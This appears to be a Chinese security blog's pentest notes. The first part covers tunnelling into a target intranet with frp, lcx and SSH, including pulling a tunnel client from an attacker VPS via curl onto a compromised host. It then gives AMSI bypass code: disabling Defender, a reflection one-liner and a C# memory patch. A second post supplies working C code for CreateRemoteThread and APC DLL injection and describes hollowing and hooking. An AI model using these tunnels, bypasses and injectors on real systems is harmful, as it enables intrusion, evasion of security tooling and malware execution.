<h6 id="场景四-TCP出网-socks代理"><a href="#场景四-TCP出网-socks代理" class="headerlink" title="场景四    TCP出网-socks代理"></a>场景四    TCP出网-socks代理</h6><p><strong><a href="https://github.com/fatedier/frp">frp</a></strong></p>
<p>搭建步骤：<br>1.VPS运行服务端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure>

<p>注：建议用Screen将frp挂起到后台，Screen挂起程序参考<a href="https://www.jianshu.com/p/b24f597c0561">用screen 在后台运行程序 - 简书</a></p>
<p>frps.ini内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 8080</span><br><span class="line">tls_only = true</span><br><span class="line">tcp_mux = true</span><br><span class="line">privilege_token = token123</span><br><span class="line">kcp_bind_port = 8080</span><br></pre></td></tr></table></figure>

<p>2.使用VPS将frpc frpc.ini上传到主机tmp目录，然后运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Linux:</span><br><span class="line">chmod +x /tmp/frpc-x86</span><br><span class="line">nohup /tmp/frpc-x86 -c /tmpfrpc.ini&gt;/dev/null nohup.out &amp;</span><br><span class="line"></span><br><span class="line">Windows</span><br><span class="line">frpc -c frpc.ini</span><br></pre></td></tr></table></figure>

<p>注：有时候用Webshell管理工具会上传失败或上传文件不完整，可以cd到frp目录，在vps使用 <code>python -m SimpleHTTPServer 80</code> 启动一个webserver，然后在客户端使用 <code>curl http://vpsip/frpc</code>下载文件。</p>
<p>以上操作成功后，VPS控制台会有输出，然后VPS会启动一个10001端口，接下来直接配置好Proxifier就可以访问目标内网了。</p>
<p>Proxifier使用参考：<a href="https://blog.csdn.net/u013600314/article/details/106276126/">Proxifier Socks5 代理（内网访问、远程办公）</a></p>
<p>ps：frp会涉及到免杀的问题，这里推荐另一个代理工具，体积更小，可以看作是rust版本的frp </p>
<p> <a href="https://github.com/editso/fuso">fuso</a></p>
<h4 id="0x02-Lcx"><a href="#0x02-Lcx" class="headerlink" title="0x02 Lcx"></a>0x02 Lcx</h4><p>内网IP：192.168.183.168<br>公网IP：192.168.183.181</p>
<h5 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h5><p>内网机器上执行命令：<code>lcx.exe –slave 公网IP 端口 内网IP 端口</code><br>将内网的3389端口转发到公网的6666端口</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">lcx.exe -slave <span class="number">192.168</span><span class="number">.183</span><span class="number">.181</span> <span class="number">6666</span> <span class="number">192.168</span><span class="number">.183</span><span class="number">.168</span> <span class="number">3389</span></span><br><span class="line">lcx.exe -slave <span class="number">192.168</span><span class="number">.183</span><span class="number">.181</span> <span class="number">6666</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">3389</span></span><br></pre></td></tr></table></figure>



<p>公网机器上执行命令：<code>lcx.exe -listen 监听端口 连接端口</code><br>将在6666端口接收到的数据转发到2222端口</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">lcx.exe -listen <span class="number">6666</span> <span class="number">2222</span></span><br></pre></td></tr></table></figure>

<p>使用命令<code>mstsc /v:127.0.0.1:2222</code>即可连接到内网3389端口</p>
<h5 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h5><p>如果内网机器防火墙禁止3389出站，可以使用tran命令将3389端口映射到其他端口上<br>内网机器上执行命令：<code>lcx.exe -tran 映射端口 连接IP 连接端口</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">lcx.exe -tran <span class="number">66</span> <span class="number">192.168</span><span class="number">.183</span><span class="number">.168</span> <span class="number">3389</span></span><br></pre></td></tr></table></figure>

<p>因为实验环境是内网所以直接连接66端口即可访问3389端口，公网还需要端口转发</p>
<h4 id="0x03-SSH隧道"><a href="#0x03-SSH隧道" class="headerlink" title="0x03  SSH隧道"></a>0x03  SSH隧道</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ssh参数详解：</span><br><span class="line">    -C Enable compression 压缩数据传输</span><br><span class="line">    -q Quiet mode. 安静模式</span><br><span class="line">    -T Disable pseudo-tty allocation. 不占用 shell</span><br><span class="line">    -f Requests ssh to go to background just before command execution. 后台运行，并推荐加上 -n 参数</span><br><span class="line">    -N Do not execute a remote command. 不执行远程命令，端口转发就用它</span><br><span class="line">    -L port:host:hostport 将本地机(客户机)的某个端口转发到远端指定机器的指定端口. </span><br><span class="line">    -R port:host:hostport 将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口. </span><br><span class="line">    -D port 指定一个本地机器动态的应用程序端口转发. </span><br><span class="line">    -g port 允许远程主机连接到建立的转发的端口，如果不加这个参数，只允许本地主机建立连接</span><br></pre></td></tr></table></figure>

<h5 id="SSH本地转发"><a href="#SSH本地转发" class="headerlink" title="SSH本地转发"></a>SSH本地转发</h5><p>语法格式：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ssh -L [local_bind_addr:]local_port:remote:remote_port middle_host</span><br></pre></td></tr></table></figure>

<p>远程管理服务器上的mysql，mysql不能直接root远程登陆。这时候就可以通过本地转发，通过ssh将服务器的3306端口转发到1234端口。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ssh -CfNg -L <span class="number">2222</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">3306</span> root@<span class="number">139.196</span>.xx.xx</span><br></pre></td></tr></table></figure>

<p>工作原理：在本地指定一个由ssh监听的转发端口2222，将远程主机的3306端口(127.0.0.1:3306)映射到本地的2222端口，当有主机连接本地映射的2222端口时，本地ssh就将此端口的数据包转发给中间主机VPS，然后VPS再与远程主机端口(127.0.0.1:3306)通信。<br>数据流向：Kali -&gt; 2222 -&gt; VPS -&gt; 127.0.0.1:3306</p>
<h5 id="SSH远程转发"><a href="#SSH远程转发" class="headerlink" title="SSH远程转发"></a>SSH远程转发</h5><p>语法格式：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ssh -R [bind_addr:]remote1_port:host:port remote1</span><br></pre></td></tr></table></figure>

<p>假设kali开了一个80端口的web服务，外网无法访问，使用远程转发，将kali的80端口转发到外网的其他端口，这时候访问外网的端口，就访问到了内网的端口。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ssh -CfNg -R <span class="number">4444</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">80</span> root@<span class="number">192.168</span><span class="number">.183</span><span class="number">.195</span></span><br></pre></td></tr></table></figure>

<p>此时在192.168.183.195这台主机上访问127.0.0.1:4444端口即可访问到kali的80端口<br>工作原理：kali在请求外网主机的sshd服务，在外网主机上建立一个套接字监听端口(4444)，它是kali的80端口的映射，当有主机连接外网的4444端口时，连接的数据全部转发给kali，再由kali去访问127.0.0.1:80。</p>
<p>这里要注意一点，远程端口转发是由远程主机上的sshd服务控制的，默认配置情况下，sshd服务只允许本地开启的远程转发端口(4444)绑定在环回地址(127.0.0.1)上，即使显式指定了bind_addr也无法覆盖。也就是这里访问127.0.0.1:4444端口可以访问成功，访问192.168.183.195:4444却不能访问成功。</p>
<p>要允许本地的远程转发端口绑定在非环回地址上，需要在外网主机的sshd配置文件中启用”GatewayPorts”项，它的默认值为no，这里将它改为yes。然后重新远程转发一下即可用外网地址访问。</p>
<h5 id="SSH动态转发-正向代理做动态的端口转发"><a href="#SSH动态转发-正向代理做动态的端口转发" class="headerlink" title="SSH动态转发,正向代理做动态的端口转发"></a>SSH动态转发,正向代理做动态的端口转发</h5><p>本地或远程转发端口和目标端口所代表的应用层协议是一对一的关系，不同的服务就要建立不同的端口，工作很是繁琐，而动态转发只需绑定一个本地端口，而目标端口是根据你发起的请求决定的，比如请求为445端口，通过ssh转发的请求也是445端口。</p>
<p>语法格式：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ssh -D [bind_addr:]port remote</span><br></pre></td></tr></table></figure>

<p>这里举一个最简单的列子：翻墙。国内正常情况下上不了Google，我们可以通过将流量转发到国外的vps上这样就可以正常访问了。<br>在本地执行以下命令，并查看建立连接情况</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ssh -Nfg -D <span class="number">3333</span> root@<span class="number">45.77</span>.xx.xx</span><br></pre></td></tr></table></figure>

<p>连接建立成功，设置浏览器到本地主机的3333端口</p>
<h5 id="SSH动态转发，正向代理进行单一的端口转发"><a href="#SSH动态转发，正向代理进行单一的端口转发" class="headerlink" title="SSH动态转发，正向代理进行单一的端口转发"></a>SSH动态转发，正向代理进行单一的端口转发</h5><p>利用ssh -L 提供正向代理，将192.168.183.2的80端口映射到45.77.xx.xx的1111端口上</p>
<p>访问45.77.xx.xx:1111相当于访问192.168.183.2:80 中间需要192.168.183.1的ssh进行正向代理进行利用。</p>
<p>语法格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -L 45.77.xx.xx:1111:192.168.183.2:80 root@192.168.183.1</span><br></pre></td></tr></table></figure>

<p>此时我们访问45.77.xx.xx的1111端口就相当于访问内网不出网机器的192.168.183.2:80</p>
<h1 id="16-Bypass-AMSI"><a href="#16-Bypass-AMSI" class="headerlink" title="16.Bypass AMSI"></a>16.Bypass AMSI</h1><p><a href="https://0range-x.github.io/2022/01/23/AMSI/">How to Bypass AMSI </a></p>
<p>管理员权限关闭amsi</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set-MpPreference</span> <span class="literal">-DisableRealtimeMonitoring</span> <span class="variable">$true</span></span><br></pre></td></tr></table></figure>

<h3 id="一键关闭AMSI"><a href="#一键关闭AMSI" class="headerlink" title="一键关闭AMSI"></a>一键关闭AMSI</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">Ref</span>].Assembly.GetType(<span class="string">&#x27;System.Management.Automation.AmsiUtils&#x27;</span>).GetField(<span class="string">&#x27;amsiInitFailed&#x27;</span>,<span class="string">&#x27;NonPubilc,Static&#x27;</span>).SetValue(<span class="variable">$null</span>,<span class="variable">$true</span>)</span><br></pre></td></tr></table></figure>

<p>被加黑了，可以混淆过</p>
<h3 id="powershell降级"><a href="#powershell降级" class="headerlink" title="powershell降级"></a>powershell降级</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -version 2   //改变powershell运行版本</span><br></pre></td></tr></table></figure>



<h3 id="内存补丁"><a href="#内存补丁" class="headerlink" title="内存补丁"></a>内存补丁</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$p=@&quot;</span><br><span class="line">using System;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line">public class Program</span><br><span class="line">&#123;</span><br><span class="line">[DllImport(&quot;kernel32&quot;)]</span><br><span class="line">public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span><br><span class="line">[DllImport(&quot;kernel32&quot;)]</span><br><span class="line">public static extern IntPtr LoadLibrary(string name);</span><br><span class="line">[DllImport(&quot;kernel32&quot;)]</span><br><span class="line">public static extern IntPtr VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,</span><br><span class="line">uint flNewProtect, out uint lpfloldProtect);</span><br><span class="line">public static void Bypass()</span><br><span class="line">&#123;</span><br><span class="line">String a =</span><br><span class="line">&quot;isma&quot;;</span><br><span class="line">IntPtr lib = LoadLibrary(String.Join(&quot;&quot;</span><br><span class="line">, a.Reverse().ToArray()) +</span><br><span class="line">&quot;</span><br><span class="line">.dll&quot;);</span><br><span class="line">IntPtr addr = GetProcAddress(lib,</span><br><span class="line">&quot;AmsiOpenSession&quot;);</span><br><span class="line">uint old = 0;</span><br><span class="line">byte[] p;</span><br><span class="line">p = new byte[6];</span><br><span class="line">p[0] = 0xB8;</span><br><span class="line">p[1] = 0xFF;</span><br><span class="line">p[2] = 0xFF;</span><br><span class="line">p[3] = 0xFF;</span><br><span class="line">p[4] = 0xFF;</span><br><span class="line">p[5] = 0xC3;</span><br><span class="line">VirtualProtect(addr, (UIntPtr)p.Length, 0x04, out old);</span><br><span class="line">Marshal.Copy(p, 0, addr, p.Length);</span><br><span class="line">VirtualProtect(addr, (UIntPtr)p.Length, old, out old);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">&quot;@</span><br><span class="line">Add-Type $p</span><br><span class="line">[Program]::Bypass()</span><br></pre></td></tr></table></figure>





<p>参考链接：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/NyDubh3/Pentesting-Active-Directory-CN</span><br><span class="line">https://github.com/shmilylty/Intranet_Penetration_Tips</span><br></pre></td></tr></table></figure>



<p>Peace.</p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>process-injection</title>
    <url>/2022/11/12/inject/</url>
    <content><![CDATA[<p>学习一些基础的windows注入方式</p>
<p>代码仓库</p>
<p><a href="https://github.com/0range-x/windows/tree/main/injection">https://github.com/0range-x/windows/tree/main/injection</a></p>
<h2 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h2><p>原理：</p>
<p>大多数Windows函数只允许一个进程对它自己操作，用来防止一个进程破坏另一个进程。但是，Windows提供了一些函数来让一个进程对另一个进程操作。</p>
<p>使用CreateRemoteThread 函数在其他进程空间中创建一个线程。</p>
<p>首先，程序在加载dll时，通常调用LoadLibrary 函数来实现dll的动态加载，loadlibrary只有一个参数，传递的是需要加载的dll路径字符串。</p>
<p>程序首先获取目标进程空间某个dll字符串的地址，将loadlibrary函数的地址作为多线程函数的地址，某个dll字符串作为多线程函数的参数，并传递给CreateRemoteThread函数在目标进程空间创建一个多线程</p>
<p>实现思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.获取被注入进程PID。</span><br><span class="line">2.在注入进程的访问令牌中开启SE_DEBUG_NAME权限。</span><br><span class="line">3.使用openOpenProcess()函数获取被注入进程句柄。</span><br><span class="line">4.使用VirtualAllocEx()函数在被注入进程内开辟缓冲区并使用WriteProcessMemory()函数写入DLL路径的字符串。</span><br><span class="line">5.使用GetProcAddress()函数在当前进程加载的kernel32.dll找到LoadLibraryA函数的地址。</span><br><span class="line">6.通过CreateRemoteThread()函数来调用LoadLibraryA()函数，在被注入进程新启动一个线程，使得被注入进程进程加载恶意的DLL。</span><br></pre></td></tr></table></figure>



<p>获取进程pid</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">GetProcessIdByName</span><span class="params">(LPCTSTR lpszProcessName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hSnapshot == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	PROCESSENTRY32 pe;</span><br><span class="line">	pe.dwSize = <span class="keyword">sizeof</span> pe;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (Process32First(hSnapshot, &amp;pe))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (lstrcmpi(lpszProcessName, pe.szExeFile) == <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				CloseHandle(hSnapshot);</span><br><span class="line">				<span class="keyword">return</span> pe.th32ProcessID;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">while</span> (Process32Next(hSnapshot, &amp;pe));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CloseHandle(hSnapshot);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, <span class="number">0</span>, GetProcessIdByName((LPCTSTR)<span class="string">&quot;fg.exe&quot;</span>));</span><br><span class="line">	LPVOID lpBaseAddress = VirtualAllocEx(hProcess, <span class="number">0</span>, <span class="number">0x1000</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	WriteProcessMemory(hProcess, lpBaseAddress, path, <span class="keyword">sizeof</span>(path), <span class="literal">NULL</span>);</span><br><span class="line">	LPTHREAD_START_ROUTINE pLoadlibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	CreateRemoteThread(hProcess, <span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pLoadlibrary, lpBaseAddress, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/12/inject/image-20221012133914979.png" alt="image-20221012133914979"></p>
<h2 id="apc注入"><a href="#apc注入" class="headerlink" title="apc注入"></a>apc注入</h2><p>原理：</p>
<p>apc为异步过程调用，指函数在指定线程中被异步执行。在Windows系统中，每个线程都会维护一个线程apc队列，通过QueryUserApc 把一个apc函数田家达奥指定线程的apc队列中。每个线程都有自己的apc队列，这个apc队列记录了要求线程执行的一些apc函数。</p>
<p>一个进程包含多个线程，为了确保能够执行插入的apc，应该向目标进程的所有线程都插入相同的apc，实现加载dll的操作。这样，只要唤醒进程中的任意线程，开始执行apc的时候，便会执行插入的apc函数，实现dll注入</p>
<p>步骤：</p>
<p>可以看到需要找到目标线程，那么我们肯定是需要获取线程id，而在这之前需要先获取进程id，之后和远程线程注入的区别就在于 使用apc函数注入</p>
<p>获取线程id</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">GetAllThreadIdByProcessId</span><span class="params">(DWORD dwProcessId)</span></span>&#123;</span><br><span class="line">	DWORD dwBufferLength = <span class="number">1000</span>;</span><br><span class="line">	THREADENTRY32 te32 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	HANDLE hSnapshot = <span class="literal">NULL</span>;</span><br><span class="line">	BOOL bRet = TRUE;</span><br><span class="line">	<span class="comment">// 获取线程快照</span></span><br><span class="line">	RtlZeroMemory(&amp;te32, <span class="keyword">sizeof</span>(te32));</span><br><span class="line">	te32.dwSize = <span class="keyword">sizeof</span>(te32);</span><br><span class="line">	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获取第一条线程快照信息</span></span><br><span class="line">	bRet = Thread32First(hSnapshot, &amp;te32);</span><br><span class="line">	<span class="keyword">while</span> (bRet)&#123;</span><br><span class="line">		<span class="comment">// 获取进程对应的线程ID</span></span><br><span class="line">		<span class="keyword">if</span> (te32.th32OwnerProcessID == dwProcessId)&#123;</span><br><span class="line">			<span class="keyword">return</span> te32.th32ThreadID;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 遍历下一个线程快照信息</span></span><br><span class="line">		bRet = Thread32Next(hSnapshot, &amp;te32);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>main</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv)</span> </span>&#123;</span><br><span class="line">	FARPROC pLoadLibrary = <span class="literal">NULL</span>;</span><br><span class="line">	HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">	HANDLE hProcess = <span class="number">0</span>;</span><br><span class="line">	DWORD dwTID = <span class="number">0</span>;</span><br><span class="line">	DWORD dwPID = <span class="number">0</span>;</span><br><span class="line">	BYTE dllname[] = <span class="string">&quot;C:\\users\\hack\\desktop\\test\\Dll.dll&quot;</span>;</span><br><span class="line">	LPVOID lpAddr = <span class="literal">NULL</span>;</span><br><span class="line">	dwPID = <span class="built_in">GetProcessIdByName</span>((LPCTSTR)<span class="string">&quot;fg.exe&quot;</span>);</span><br><span class="line">	hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="number">0</span>, dwPID);</span><br><span class="line">	<span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to OpenProcess. Error: %d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	pLoadLibrary = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (pLoadLibrary == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to GetProcAddress. Error: %d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	lpAddr = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(dllname) + <span class="number">1</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (lpAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to VirtualAllocEx. Error: %d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">WriteProcessMemory</span>(hProcess, lpAddr, dllname, <span class="built_in"><span class="keyword">sizeof</span></span>(dllname) + <span class="number">1</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-]Failed to WriteProcessMemory. Error: %d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	dwTID = <span class="built_in">GetAllThreadIdByProcessId</span>(dwPID);</span><br><span class="line">	hThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, TRUE, dwTID);</span><br><span class="line">	<span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to OpenThread. Error: %d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">QueueUserAPC</span>((PAPCFUNC)pLoadLibrary, hThread, (ULONG_PTR)lpAddr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Inject successfully.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>错误总结：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.分配内存时 VirtualAllocEx 的第4个参数 只能用MEM_COMMIT,表示当前内存正在被使用 ,不能使用MEM_RELEASE</span><br><span class="line">2.测试失败，调试了很久，每一步都没报错，就是没有办法弹窗，在Win10 和win7 测试</span><br></pre></td></tr></table></figure>



<h2 id="Reflective-注入"><a href="#Reflective-注入" class="headerlink" title="Reflective 注入"></a>Reflective 注入</h2><p>关键在于reflectiveloader </p>
<p>原理：</p>
<p>不依赖于Windows提供的loadlibrary 函数，设计者自己在程序内实现pe的内存展开，由于是自己实现，所以不会在操作系统中有记录。以及可以对展开的pe文件做一些处理，比如抹除dos头，同时不会再peb的ldr链表中记录。     </p>
<p>步骤实现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.获取被注入进程为解析的dll的及地址</span><br><span class="line">2.获得dll句柄和函数为修复导入表做准备</span><br><span class="line">3.分配一块新内存去解析dll，并把pe头复制到新内存中和将各节复制到新内存中</span><br><span class="line">4.修复重定向表和导入表</span><br><span class="line">5.执行dllmain函数 </span><br></pre></td></tr></table></figure>

<p>在反射dll时，我们需要将dll的所有依赖库加载到当前进程中，并修复IAT以确保dll导入的函数指向当前进程内存空间的正确函数地址。为了加载依赖库，需要遍历所有的 Import Descriptor 。</p>
<p>在读取并加载相应的库之后，我们需要遍历所有thunk，使用<code>GetProcAddress</code> 解析他们的地址并将他们放入IAT中，以便dll可以在需要时引用他们。</p>
<p>在这之后，IAT修复完毕，可以执行dll了。</p>
<p>tips：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DWORD_PTR 这个类型可以放下一个DWORD类型 并且放下一个指针，在64位的环境下混用很可能造成程序越界崩溃</span><br><span class="line">*_ptr 是在64位的新类型用来代替32位下的DWORD</span><br></pre></td></tr></table></figure>

<p>代码</p>
<p><a href="https://github.com/0range-x/windows/blob/main/injection/reflective.cpp">https://github.com/0range-x/windows/blob/main/injection/reflective.cpp</a></p>
<h2 id="API-Hook"><a href="#API-Hook" class="headerlink" title="API Hook"></a>API Hook</h2><h4 id="Inline-Hook覆盖代码-修改函数代码"><a href="#Inline-Hook覆盖代码-修改函数代码" class="headerlink" title="Inline Hook覆盖代码 -修改函数代码"></a>Inline Hook覆盖代码 -修改函数代码</h4><p>可以看到这里代码有一点麻烦，相比较IAT hook，需要去看硬编码，但是如果函数不是以 <code>LoadLibrary</code>加载，就不会出现在导入表里，IAT hook就无法使用，只能使用InLine hook</p>
<p>以messageboxA为例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.获取MessageBoxA 函数的内存地址</span><br><span class="line">2.读取MessageBoxA的前6个字节</span><br><span class="line">3.创建一个hook函数 在被hook函数执行的时候执行</span><br><span class="line">4.获取hook函数的内存地址</span><br><span class="line">5.patch 被hook函数，重定向到hook函数</span><br><span class="line">6.调用被hook函数</span><br><span class="line">7.执行hook函数</span><br></pre></td></tr></table></figure>

<p>messageboxA的地址<strong>76E60570</strong></p>
<p>代码仓库：</p>
<p><a href="https://github.com/0range-x/windows/blob/main/injection/jmphook.cpp">https://github.com/0range-x/windows/blob/main/injection/jmphook.cpp</a></p>
<h4 id="IAT-hook-修改函数地址"><a href="#IAT-hook-修改函数地址" class="headerlink" title="IAT hook -修改函数地址"></a>IAT hook -修改函数地址</h4><p>其中IAT hook前后的区别</p>
<p>hook前</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.调用messageBoxA函数</span><br><span class="line">2.程序在IAT中查找MessageBoxA的地址</span><br><span class="line">3.代码执行跳转到第二步解析的地址</span><br></pre></td></tr></table></figure>

<p>hook后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.像hook之前一样调用MessageBoxA</span><br><span class="line">2.在IAT中查找MessageBoxA的地址</span><br><span class="line">3.因为IAT被修改，IAT中MessageBoxA的地址指向了hookedMessagebox函数地址</span><br><span class="line">4.程序跳转到hookedMessagebox</span><br><span class="line">5.hookedmessagebox 函数拦截MessageBoxA参数并执行一些恶意代码</span><br><span class="line">6.hookedMessageBox 调用合法的MessageBoxA例程</span><br></pre></td></tr></table></figure>

<p>说明：</p>
<p>IAT hook通常由诸如目标进程的dll执行，为了简便，在下面的例子中，IAT hook 是在本地进程实现的</p>
<p>IAT hook大致步骤：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.保存原来的MessageBoxA内存地址</span><br><span class="line">2.定义MessageBoxA函数原型</span><br><span class="line">3.使用上述原型创建一个HookedMessagebox函数</span><br><span class="line">4.解析IAT表，直到找到MessageBoxA的地址</span><br><span class="line">5.用hookedMessagebox的地址替换MessageBoxA的地址</span><br></pre></td></tr></table></figure>

<p>IATHook</p>
<p><a href="https://github.com/0range-x/windows/blob/main/injection/IAThook.cpp">https://github.com/0range-x/windows/blob/main/injection/IAThook.cpp</a></p>
<h2 id="hollowing"><a href="#hollowing" class="headerlink" title="hollowing"></a>hollowing</h2><p>进程镂空，又叫傀儡进程，是一种防御规避的进程注入技术，主要思想是写在合法进程的内存，写入恶意软件的代码，伪装成合法进程进行恶意活动。</p>
<p>看到有些文章说需要取消生成重定位表，但是我这里没有取消，也是可以正常镂空注入成功的，是因为在使用<code>VirtualAllocEx</code>申请内存空间是，将傀儡进程的<code>ImageBaseAddress</code>作为申请空间的首地址，这样就避免了重定位的问题。</p>
<p><img src="/2022/11/12/inject/image-20221018162621742.png" alt="image-20221018162621742"></p>
<p>peb偏移8个字节处， 这个进程的装载地址，就是pe可选头里的imagebase</p>
<p><img src="/2022/11/12/inject/image-20221019111241988.png" alt="image-20221019111241988"></p>
<p>两种方式：</p>
